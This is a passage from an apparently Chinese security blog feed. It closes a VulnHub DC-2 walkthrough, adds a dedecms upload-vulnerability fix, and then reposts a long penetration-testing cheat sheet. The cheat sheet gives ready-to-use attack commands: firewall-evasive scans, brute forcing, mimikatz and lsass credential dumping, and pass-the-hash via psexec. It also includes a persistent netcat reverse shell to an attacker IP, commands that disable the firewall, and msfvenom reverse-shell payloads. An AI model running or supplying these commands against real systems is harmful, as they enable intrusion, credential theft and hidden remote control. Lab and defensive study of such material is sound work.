<p>它在说什么？？？注意到，最后那句话， 唯一条件，jerry 可以用 root 权限执行 git </p>
<p>好吧，技术有限，不知道怎么办了，于是找了一篇管理最后提权的<a href="https://pentesterjourney.com/2019/05/17/vulnhub-dc-2-walkthrough/">博客</a>,其中介绍到<a href="https://gtfobins.github.io/">GTFOBins</a>是一个精选的Unix二进制列表，攻击者可以利用它来绕过本地安全限制</p>
<p>找到关于git的相关利用方法</p>
<img src="https://ckcah.github.io/images/DC_2/21.png">

<img src="https://ckcah.github.io/images/DC_2/22.png">

<p>使用上边的方法，可以直接提权，原理大概就是通过交互模式来绕过受限环境，已达到提权的效果</p>
<img src="https://ckcah.github.io/images/DC_2/23.png">

<p>成功提权</p>
<img src="https://ckcah.github.io/images/DC_2/24.png">

<p>查看最后一个flag！！！</p>
<img src="https://ckcah.github.io/images/DC_2/25.png">

<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>kali</category>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>dedecms低于5.7SP2任意文件上传漏洞</title>
    <url>/2020/05/11/dedecms%E4%BD%8E%E4%BA%8E5-7SP2%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>文件<code>/dede/file_class.php</code></p>
<h1 id="修复方法："><a href="#修复方法：" class="headerlink" title="修复方法："></a>修复方法：</h1><p>打开/dede/file_class.php<br>找到大概第161行的代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">else if(preg_match(&quot;/\.(&quot;.$fileexp.&quot;)/i&quot;,$filename))</span><br></pre></td></tr></table></figure>

<p>修改为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">else if(substr($filename, -strlen($fileexp))===$fileexp)</span><br></pre></td></tr></table></figure><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
  </entry>
  <entry>
    <title>渗透测试实战技巧</title>
    <url>/2020/05/10/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8A%80%E5%B7%A7/</url>
    <content><![CDATA[<p><strong>转载于<a href="https://www.freebuf.com/sectool/105524.html">https://www.freebuf.com/sectool/105524.html</a></strong></p>
<h3 id="最好的-NMAP-扫描策略"><a href="#最好的-NMAP-扫描策略" class="headerlink" title="最好的 NMAP 扫描策略"></a>最好的 NMAP 扫描策略</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 适用所有大小网络最好的 nmap 扫描策略</span><br><span class="line"></span><br><span class="line"># 主机发现，生成存活主机列表</span><br><span class="line">$ nmap -sn -T4 -oG Discovery.gnmap 192.168.56.0/24</span><br><span class="line">$ grep &quot;Status: Up&quot; Discovery.gnmap | cut -f 2 -d &#x27; &#x27; &gt; LiveHosts.txt</span><br><span class="line"></span><br><span class="line"># 端口发现，发现大部分常用端口</span><br><span class="line"># http://nmap.org/presentations/BHDC08/bhdc08-slides-fyodor.pdf</span><br><span class="line">$ nmap -sS -T4 -Pn -oG TopTCP -iL LiveHosts.txt</span><br><span class="line">$ nmap -sU -T4 -Pn -oN TopUDP -iL LiveHosts.txt</span><br><span class="line">$ nmap -sS -T4 -Pn --top-ports 3674 -oG 3674 -iL LiveHosts.txt</span><br><span class="line"></span><br><span class="line"># 端口发现，发现全部端口，但 UDP 端口的扫描会非常慢</span><br><span class="line">$ nmap -sS -T4 -Pn -p 0-65535 -oN FullTCP -iL LiveHosts.txt</span><br><span class="line">$ nmap -sU -T4 -Pn -p 0-65535 -oN FullUDP -iL LiveHosts.txt</span><br><span class="line"></span><br><span class="line"># 显示 TCP\UDP 端口</span><br><span class="line">$ grep &quot;open&quot; FullTCP|cut -f 1 -d &#x27; &#x27; | sort -nu | cut -f 1 -d &#x27;/&#x27; |xargs | sed &#x27;s/ /,/g&#x27;|awk &#x27;&#123;print &quot;T:&quot;$0&#125;&#x27;</span><br><span class="line">$ grep &quot;open&quot; FullUDP|cut -f 1 -d &#x27; &#x27; | sort -nu | cut -f 1 -d &#x27;/&#x27; |xargs | sed &#x27;s/ /,/g&#x27;|awk &#x27;&#123;print &quot;U:&quot;$0&#125;&#x27;</span><br><span class="line"></span><br><span class="line"># 侦测服务版本</span><br><span class="line">$ nmap -sV -T4 -Pn -oG ServiceDetect -iL LiveHosts.txt</span><br><span class="line"></span><br><span class="line"># 扫做系统扫描</span><br><span class="line">$ nmap -O -T4 -Pn -oG OSDetect -iL LiveHosts.txt</span><br><span class="line"></span><br><span class="line"># 系统和服务检测</span><br><span class="line">$ nmap -O -sV -T4 -Pn -p U:53,111,137,T:21-25,80,139,8080 -oG OS_Service_Detect -iL LiveHosts.txt</span><br></pre></td></tr></table></figure>

<h3 id="Nmap-–-躲避防火墙"><a href="#Nmap-–-躲避防火墙" class="headerlink" title="Nmap – 躲避防火墙"></a>Nmap – 躲避防火墙</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 分段</span><br><span class="line">$ nmap -f</span><br><span class="line"></span><br><span class="line"># 修改默认 MTU 大小，但必须为 8 的倍数(8,16,24,32 等等)</span><br><span class="line">$ nmap --mtu 24</span><br><span class="line"></span><br><span class="line"># 生成随机数量的欺骗</span><br><span class="line">$ nmap -D RND:10 [target]</span><br><span class="line"></span><br><span class="line"># 手动指定欺骗使用的 IP</span><br><span class="line">$ nmap -D decoy1,decoy2,decoy3 etc.</span><br><span class="line"></span><br><span class="line"># 僵尸网络扫描, 首先需要找到僵尸网络的IP</span><br><span class="line">$ nmap -sI [Zombie IP] [Target IP]</span><br><span class="line"></span><br><span class="line"># 指定源端口号</span><br><span class="line">$ nmap --source-port 80 IP</span><br><span class="line"></span><br><span class="line"># 在每个扫描数据包后追加随机数量的数据</span><br><span class="line">$ nmap --data-length 25 IP</span><br><span class="line"></span><br><span class="line"># MAC 地址欺骗，可以生成不同主机的 MAC 地址</span><br><span class="line">$ nmap --spoof-mac Dell/Apple/3Com IP</span><br></pre></td></tr></table></figure>

<h3 id="Nmap-进行-Web-漏洞扫描"><a href="#Nmap-进行-Web-漏洞扫描" class="headerlink" title="Nmap 进行 Web 漏洞扫描"></a>Nmap 进行 Web 漏洞扫描</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /usr/share/nmap/scripts/</span><br><span class="line">wget http://www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz &amp;&amp; tar xzf nmap_nse_vulscan-2.0.tar.gz</span><br><span class="line">nmap -sS -sV --script=vulscan/vulscan.nse target</span><br><span class="line">nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv target</span><br><span class="line">nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv -p80 target</span><br><span class="line">nmap -PN -sS -sV --script=vulscan –script-args vulscancorrelation=1 -p80 target</span><br><span class="line">nmap -sV --script=vuln target</span><br><span class="line">nmap -PN -sS -sV --script=all –script-args vulscancorrelation=1 target</span><br></pre></td></tr></table></figure>

<h3 id="使用-DIRB-爆破目录"><a href="#使用-DIRB-爆破目录" class="headerlink" title="使用 DIRB 爆破目录"></a>使用 DIRB 爆破目录</h3><p>注：<a href="http://dirb.sourceforge.net/">DIRB</a> 是一个专门用于爆破目录的工具，在 Kali 中默认已经安装，类似工具还有国外的<a href="https://github.com/lanjelot/patator">patator</a>，<a href="https://github.com/maurosoria/dirsearch">dirsearch</a>，<a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project">DirBuster</a>， 国内的御剑等等。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirb http://IP:PORT /usr/share/dirb/wordlists/common.txt</span><br></pre></td></tr></table></figure>

<h3 id="Patator-–-全能暴力破解测试工具"><a href="#Patator-–-全能暴力破解测试工具" class="headerlink" title="Patator – 全能暴力破解测试工具"></a>Patator – 全能暴力破解测试工具</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># git clone https://github.com/lanjelot/patator.git /usr/share/patator</span><br><span class="line"></span><br><span class="line"># SMTP 爆破</span><br><span class="line">$ patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst</span><br><span class="line">$ patator smtp_login host=192.168.17.129 user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst</span><br><span class="line">$ patator smtp_login host=192.168.17.129 helo=&#x27;ehlo 192.168.17.128&#x27; user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst</span><br><span class="line">$ patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst -x ignore:fgrep=&#x27;incorrect password or account name&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="使用-Fierce-爆破-DNS"><a href="#使用-Fierce-爆破-DNS" class="headerlink" title="使用 Fierce 爆破 DNS"></a>使用 Fierce 爆破 DNS</h3><p>注：Fierce 会检查 DNS 服务器是否允许区域传送。如果允许，就会进行区域传送并通知用户，如果不允许，则可以通过查询 DNS 服务器枚举主机名。类似工具：<a href="https://github.com/lijiejie/subDomainsBrute">subDomainsBrute</a> 和 <a href="https://github.com/TheRook/subbrute/">SubBrute</a> 等等</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># http://ha.ckers.org/fierce/</span><br><span class="line">$ ./fierce.pl -dns example.com</span><br><span class="line">$ ./fierce.pl –dns example.com –wordlist myWordList.txt</span><br></pre></td></tr></table></figure>

<h3 id="使用-Nikto-扫描-Web-服务"><a href="#使用-Nikto-扫描-Web-服务" class="headerlink" title="使用 Nikto 扫描 Web 服务"></a>使用 Nikto 扫描 Web 服务</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nikto -C all -h http://IP</span><br></pre></td></tr></table></figure>

<h3 id="扫描-WordPress"><a href="#扫描-WordPress" class="headerlink" title="扫描 WordPress"></a>扫描 WordPress</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/wpscanteam/wpscan.git &amp;&amp; cd wpscan</span><br><span class="line">./wpscan –url http://IP/ –enumerate p</span><br></pre></td></tr></table></figure>

<h3 id="HTTP-指纹识别"><a href="#HTTP-指纹识别" class="headerlink" title="HTTP 指纹识别"></a>HTTP 指纹识别</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://www.net-square.com/_assets/httprint_linux_301.zip &amp;&amp; unzip httprint_linux_301.zip</span><br><span class="line">cd httprint_301/linux/</span><br><span class="line">./httprint -h http://IP -s signatures.txt</span><br></pre></td></tr></table></figure>

<h3 id="使用-Skipfish-扫描"><a href="#使用-Skipfish-扫描" class="headerlink" title="使用 Skipfish 扫描"></a>使用 Skipfish 扫描</h3><p>注：Skipfish 是一款 Web 应用安全侦查工具，Skipfish 会利用递归爬虫和基于字典的探针生成一幅交互式网站地图，最终生成的地图会在通过安全检查后输出。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">skipfish -m 5 -LY -S /usr/share/skipfish/dictionaries/complete.wl -o ./skipfish2 -u http://IP</span><br></pre></td></tr></table></figure>

<h3 id="使用-NC-扫描"><a href="#使用-NC-扫描" class="headerlink" title="使用 NC 扫描"></a>使用 NC 扫描</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -v -w 1 target -z 1-1000</span><br><span class="line">for i in &#123;101..102&#125;; do nc -vv -n -w 1 192.168.56.$i 21-25 -z; done</span><br></pre></td></tr></table></figure>

<h3 id="Unicornscan"><a href="#Unicornscan" class="headerlink" title="Unicornscan"></a>Unicornscan</h3><p>注：<a href="http://www.unicornscan.org/">Unicornscan</a> 是一个信息收集和安全审计的工具。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">us -H -msf -Iv 192.168.56.101 -p 1-65535</span><br><span class="line">us -H -mU -Iv 192.168.56.101 -p 1-65535</span><br><span class="line"></span><br><span class="line">-H 在生成报告阶段解析主机名</span><br><span class="line">-m 扫描类型 (sf - tcp, U - udp)</span><br><span class="line">-Iv - 详细</span><br></pre></td></tr></table></figure>

<h3 id="使用-Xprobe2-识别操作系统指纹"><a href="#使用-Xprobe2-识别操作系统指纹" class="headerlink" title="使用 Xprobe2 识别操作系统指纹"></a>使用 Xprobe2 识别操作系统指纹</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xprobe2 -v -p tcp:80:open IP</span><br></pre></td></tr></table></figure>

<h3 id="枚举-Samba"><a href="#枚举-Samba" class="headerlink" title="枚举 Samba"></a>枚举 Samba</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmblookup -A target</span><br><span class="line">smbclient //MOUNT/share -I target -N</span><br><span class="line">rpcclient -U &quot;&quot; target</span><br><span class="line">enum4linux target</span><br></pre></td></tr></table></figure>

<h3 id="枚举-SNMP"><a href="#枚举-SNMP" class="headerlink" title="枚举 SNMP"></a>枚举 SNMP</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">snmpget -v 1 -c public IP</span><br><span class="line">snmpwalk -v 1 -c public IP</span><br><span class="line">snmpbulkwalk -v2c -c public -Cn0 -Cr10 IP</span><br></pre></td></tr></table></figure>

<h3 id="实用的-Windows-cmd-命令"><a href="#实用的-Windows-cmd-命令" class="headerlink" title="实用的 Windows cmd 命令"></a>实用的 Windows cmd 命令</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net localgroup Users</span><br><span class="line">net localgroup Administrators</span><br><span class="line">search dir/s *.doc</span><br><span class="line">system(&quot;start cmd.exe /k $cmd&quot;)</span><br><span class="line">sc create microsoft_update binpath=&quot;cmd /K start c:\nc.exe -d ip-of-hacker port -e cmd.exe&quot; start= auto error= ignore</span><br><span class="line">/c C:\nc.exe -e c:\windows\system32\cmd.exe -vv 23.92.17.103 7779</span><br><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;</span><br><span class="line">Procdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;</span><br><span class="line">C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp 32 位系统</span><br><span class="line">C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp 64 位系统</span><br></pre></td></tr></table></figure>

<h3 id="PuTTY-连接隧道"><a href="#PuTTY-连接隧道" class="headerlink" title="PuTTY 连接隧道"></a>PuTTY 连接隧道</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">转发远程端口到目标地址</span><br><span class="line">plink.exe -P 22 -l root -pw &quot;1234&quot; -R 445:127.0.0.1:445 IP</span><br></pre></td></tr></table></figure>

<h3 id="Meterpreter-端口转发"><a href="#Meterpreter-端口转发" class="headerlink" title="Meterpreter 端口转发"></a>Meterpreter 端口转发</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># https://www.offensive-security.com/metasploit-unleashed/portfwd/</span><br><span class="line"># 转发远程端口到目标地址</span><br><span class="line">meterpreter &gt; portfwd add –l 3389 –p 3389 –r 172.16.194.141</span><br><span class="line">kali &gt; rdesktop 127.0.0.1:3389</span><br></pre></td></tr></table></figure>

<h3 id="开启-RDP-服务"><a href="#开启-RDP-服务" class="headerlink" title="开启 RDP 服务"></a>开启 RDP 服务</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add &quot;hklm\system\currentcontrolset\control\terminal server&quot; /f /v fDenyTSConnections /t REG_DWORD /d 0</span><br><span class="line">netsh firewall set service remoteadmin enable</span><br><span class="line">netsh firewall set service remotedesktop enable</span><br></pre></td></tr></table></figure>

<h3 id="关闭-Windows-防火墙"><a href="#关闭-Windows-防火墙" class="headerlink" title="关闭 Windows 防火墙"></a>关闭 Windows 防火墙</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh firewall set opmode disable</span><br></pre></td></tr></table></figure>

<h3 id="Meterpreter-VNC-RDP"><a href="#Meterpreter-VNC-RDP" class="headerlink" title="Meterpreter VNC\RDP"></a>Meterpreter VNC\RDP</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># https://www.offensive-security.com/metasploit-unleashed/enabling-remote-desktop/</span><br><span class="line">run getgui -u admin -p 1234</span><br><span class="line">run vnc -p 5043</span><br></pre></td></tr></table></figure>

<h3 id="使用-Mimikatz"><a href="#使用-Mimikatz" class="headerlink" title="使用 Mimikatz"></a>使用 Mimikatz</h3><p>获取 Windows 明文用户名密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/gentilkiwi/mimikatz.git</span><br><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonPasswords full</span><br></pre></td></tr></table></figure>

<h3 id="获取哈希值"><a href="#获取哈希值" class="headerlink" title="获取哈希值"></a>获取哈希值</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/byt3bl33d3r/pth-toolkit</span><br><span class="line">pth-winexe -U hash //IP cmd</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">apt-get install freerdp-x11</span><br><span class="line">xfreerdp /u:offsec /d:win2012 /pth:HASH /v:IP</span><br><span class="line"></span><br><span class="line">在或者</span><br><span class="line"></span><br><span class="line">meterpreter &gt; run post/windows/gather/hashdump</span><br><span class="line">Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::</span><br><span class="line">msf &gt; use exploit/windows/smb/psexec</span><br><span class="line">msf exploit(psexec) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(psexec) &gt; set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c</span><br><span class="line">msf exploit(psexec) &gt; exploit</span><br><span class="line">meterpreter &gt; shell</span><br></pre></td></tr></table></figure>

<h3 id="使用-Hashcat-破解密码"><a href="#使用-Hashcat-破解密码" class="headerlink" title="使用 Hashcat 破解密码"></a>使用 Hashcat 破解密码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat -m 400 -a 0 hash /root/rockyou.txt</span><br></pre></td></tr></table></figure>

<h3 id="使用-NC-抓取-Banner-信息"><a href="#使用-NC-抓取-Banner-信息" class="headerlink" title="使用 NC 抓取 Banner 信息"></a>使用 NC 抓取 Banner 信息</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc 192.168.0.10 80</span><br><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: 192.168.0.10</span><br><span class="line">User-Agent: Mozilla/4.0</span><br><span class="line">Referrer: www.example.com</span><br><span class="line">&lt;enter&gt;</span><br><span class="line">&lt;enter&gt;</span><br></pre></td></tr></table></figure>

<h3 id="使用-NC-在-Windows-上反弹-shell"><a href="#使用-NC-在-Windows-上反弹-shell" class="headerlink" title="使用 NC 在 Windows 上反弹 shell"></a>使用 NC 在 Windows 上反弹 shell</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c:&gt;nc -Lp 31337 -vv -e cmd.exe</span><br><span class="line">nc 192.168.0.10 31337</span><br><span class="line">c:&gt;nc example.com 80 -e cmd.exe</span><br><span class="line">nc -lp 80</span><br><span class="line"></span><br><span class="line">nc -lp 31337 -e /bin/bash</span><br><span class="line">nc 192.168.0.10 31337</span><br><span class="line">nc -vv -r(random) -w(wait) 1 192.168.0.10 -z(i/o error) 1-1000</span><br></pre></td></tr></table></figure>

<h3 id="查找-SUID-SGID-root-文件"><a href="#查找-SUID-SGID-root-文件" class="headerlink" title="查找 SUID\SGID root 文件"></a>查找 SUID\SGID root 文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查找 SUID root 文件</span><br><span class="line">find / -user root -perm -4000 -print</span><br><span class="line"></span><br><span class="line"># 查找 SGID root 文件:</span><br><span class="line">find / -group root -perm -2000 -print</span><br><span class="line"></span><br><span class="line"># 查找 SUID 和 SGID 文件:</span><br><span class="line">find / -perm -4000 -o -perm -2000 -print</span><br><span class="line"></span><br><span class="line"># 查找不属于任何用户的文件:</span><br><span class="line">find / -nouser -print</span><br><span class="line"></span><br><span class="line"># 查找不属于任何用户组的文件:</span><br><span class="line">find / -nogroup -print</span><br><span class="line"></span><br><span class="line"># 查找软连接及其指向:</span><br><span class="line">find / -type l -ls</span><br></pre></td></tr></table></figure>

<h3 id="Python-shell"><a href="#Python-shell" class="headerlink" title="Python shell"></a>Python shell</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="Python-Ruby-PHP-HTTP-服务器"><a href="#Python-Ruby-PHP-HTTP-服务器" class="headerlink" title="Python\Ruby\PHP HTTP 服务器"></a>Python\Ruby\PHP HTTP 服务器</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 -m SimpleHTTPServer</span><br><span class="line">python3 -m http.server</span><br><span class="line">ruby -rwebrick -e &quot;WEBrick::HTTPServer.new(:Port =&gt; 8888, </span><br><span class="line"> ocumentRoot =&gt; Dir.pwd).start&quot;</span><br><span class="line">php -S 0.0.0.0:8888</span><br></pre></td></tr></table></figure>

<h3 id="获取进程对应的-PID"><a href="#获取进程对应的-PID" class="headerlink" title="获取进程对应的 PID"></a>获取进程对应的 PID</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fuser -nv tcp 80</span><br><span class="line">fuser -k -n tcp 80</span><br></pre></td></tr></table></figure>

<h3 id="使用-Hydra-爆破-RDP"><a href="#使用-Hydra-爆破-RDP" class="headerlink" title="使用 Hydra 爆破 RDP"></a>使用 Hydra 爆破 RDP</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -l admin -P /root/Desktop/passwords -S X.X.X.X rdp</span><br></pre></td></tr></table></figure>

<h3 id="挂载远程-Windows-共享文件夹"><a href="#挂载远程-Windows-共享文件夹" class="headerlink" title="挂载远程 Windows 共享文件夹"></a>挂载远程 Windows 共享文件夹</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw</span><br></pre></td></tr></table></figure>

<h3 id="Kali-下编译-Exploit"><a href="#Kali-下编译-Exploit" class="headerlink" title="Kali 下编译 Exploit"></a>Kali 下编译 Exploit</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -m32 -o output32 hello.c (32 位)</span><br><span class="line">gcc -m64 -o output hello.c (64 位)</span><br></pre></td></tr></table></figure>

<h3 id="Kali-下编译-Windows-Exploit"><a href="#Kali-下编译-Windows-Exploit" class="headerlink" title="Kali 下编译 Windows Exploit"></a>Kali 下编译 Windows Exploit</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget -O mingw-get-setup.exe http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download</span><br><span class="line">wine mingw-get-setup.exe</span><br><span class="line">select mingw32-base</span><br><span class="line">cd /root/.wine/drive_c/windows</span><br><span class="line">wget http://gojhonny.com/misc/mingw_bin.zip &amp;&amp; unzip mingw_bin.zip</span><br><span class="line">cd /root/.wine/drive_c/MinGW/bin</span><br><span class="line">wine gcc -o ability.exe /tmp/exploit.c -lwsock32</span><br><span class="line">wine ability.exe</span><br></pre></td></tr></table></figure>

<h3 id="NASM-命令"><a href="#NASM-命令" class="headerlink" title="NASM 命令"></a>NASM 命令</h3><p>注：NASM 全称 The Netwide Assembler，是一款基于80×86和x86-64平台的汇编语言编译程序，其设计初衷是为了实现编译器程序跨平台和模块化的特性。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nasm -f bin -o payload.bin payload.asm</span><br><span class="line">nasm -f elf payload.asm; ld -o payload payload.o; objdump -d payload</span><br></pre></td></tr></table></figure>

<h3 id="SSH-穿透"><a href="#SSH-穿透" class="headerlink" title="SSH 穿透"></a>SSH 穿透</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -D 127.0.0.1:1080 -p 22 user@IP</span><br><span class="line">Add socks4 127.0.0.1 1080 in /etc/proxychains.conf</span><br><span class="line">proxychains commands target</span><br></pre></td></tr></table></figure>

<h3 id="SSH-穿透从一个网络到另一个网络"><a href="#SSH-穿透从一个网络到另一个网络" class="headerlink" title="SSH 穿透从一个网络到另一个网络"></a>SSH 穿透从一个网络到另一个网络</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -D 127.0.0.1:1080 -p 22 user1@IP1</span><br><span class="line">Add socks4 127.0.0.1 1080 in /etc/proxychains.conf</span><br><span class="line">proxychains ssh -D 127.0.0.1:1081 -p 22 user1@IP2</span><br><span class="line">Add socks4 127.0.0.1 1081 in /etc/proxychains.conf</span><br><span class="line">proxychains commands target</span><br></pre></td></tr></table></figure>

<h3 id="使用-metasploit-进行穿透"><a href="#使用-metasploit-进行穿透" class="headerlink" title="使用 metasploit 进行穿透"></a>使用 metasploit 进行穿透</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">route add X.X.X.X 255.255.255.0 1</span><br><span class="line">use auxiliary/server/socks4a</span><br><span class="line">run</span><br><span class="line">proxychains msfcli windows/* PAYLOAD=windows/meterpreter/reverse_tcp LHOST=IP LPORT=443 RHOST=IP E</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line"># https://www.offensive-security.com/metasploit-unleashed/pivoting/</span><br><span class="line">meterpreter &gt; ipconfig</span><br><span class="line">IP Address  : 10.1.13.3</span><br><span class="line">meterpreter &gt; run autoroute -s 10.1.13.0/24</span><br><span class="line">meterpreter &gt; run autoroute -p</span><br><span class="line">10.1.13.0          255.255.255.0      Session 1</span><br><span class="line">meterpreter &gt; Ctrl+Z</span><br><span class="line">msf auxiliary(tcp) &gt; use exploit/windows/smb/psexec</span><br><span class="line">msf exploit(psexec) &gt; set RHOST 10.1.13.2</span><br><span class="line">msf exploit(psexec) &gt; exploit</span><br><span class="line">meterpreter &gt; ipconfig</span><br><span class="line">IP Address  : 10.1.13.2</span><br></pre></td></tr></table></figure>

<h3 id="基于-CSV-文件查询-Exploit-DB"><a href="#基于-CSV-文件查询-Exploit-DB" class="headerlink" title="基于 CSV 文件查询 Exploit-DB"></a>基于 CSV 文件查询 Exploit-DB</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/offensive-security/exploit-database.git</span><br><span class="line">cd exploit-database</span><br><span class="line">./searchsploit –u</span><br><span class="line">./searchsploit apache 2.2</span><br><span class="line">./searchsploit &quot;Linux Kernel&quot;</span><br><span class="line"></span><br><span class="line">cat files.csv | grep -i linux | grep -i kernel | grep -i local | grep -v dos | uniq | grep 2.6 | egrep &quot;&lt;|&lt;=&quot; | sort -k3</span><br></pre></td></tr></table></figure>

<h3 id="MSF-Payloads"><a href="#MSF-Payloads" class="headerlink" title="MSF Payloads"></a>MSF Payloads</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; X &gt; system.exe</span><br><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 R &gt; exploit.php</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -e -a x86 --platform win -f asp -o file.asp</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -e x86/shikata_ga_nai -b &quot;\x00&quot; -a x86 --platform win -f c</span><br></pre></td></tr></table></figure>

<h3 id="MSF-生成在-Linux-下反弹的-Meterpreter-Shell"><a href="#MSF-生成在-Linux-下反弹的-Meterpreter-Shell" class="headerlink" title="MSF 生成在 Linux 下反弹的 Meterpreter Shell"></a>MSF 生成在 Linux 下反弹的 Meterpreter Shell</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -e -f elf -a x86 --platform linux -o shell</span><br></pre></td></tr></table></figure>

